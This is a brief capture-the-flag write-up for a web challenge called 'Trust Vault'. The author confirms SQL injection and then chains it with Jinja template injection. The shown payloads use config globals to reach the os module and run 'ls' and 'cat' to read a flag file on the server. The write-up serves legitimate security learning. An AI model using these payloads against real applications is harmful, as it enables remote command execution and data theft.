# 🟢 Trust Vault

<figure><img src="../../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

we will register first then login

<figure><img src="../../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

we can already see other people's payload

<figure><img src="../../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

in bookmark i tried SSTI and hint already said jinja rendering so no need to go through the process of finding which Template Engine backend is using

<figure><img src="../../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

in Response i found hidden path

<figure><img src="../../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

when i clicked my SSTI bookmark it showed SQL query

<figure><img src="../../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

i got 2 different result from 2 different payload which confirmed SQLi

```
hello
```

```
hello' or '1'='1
```

now i have to find SSTI

<figure><img src="../../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

SSTI confirmed

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

```
hello' or '1'='{{config.items()}}'
```

<figure><img src="../../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

```
hello' or '1'='{{config.__class__.__init__.__globals__["os"].popen("ls").read()}}'
```

```
hello' or '1'='{{config.__class__.__init__.__globals__["os"].popen("ls ../").read()}}'
```

<figure><img src="../../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

```
hello' or '1'='{{config.__class__.__init__.__globals__["os"].popen("cat ../flag-f571a6e6ddc3671df91309cf97e5a624.txt").read()}}'
```
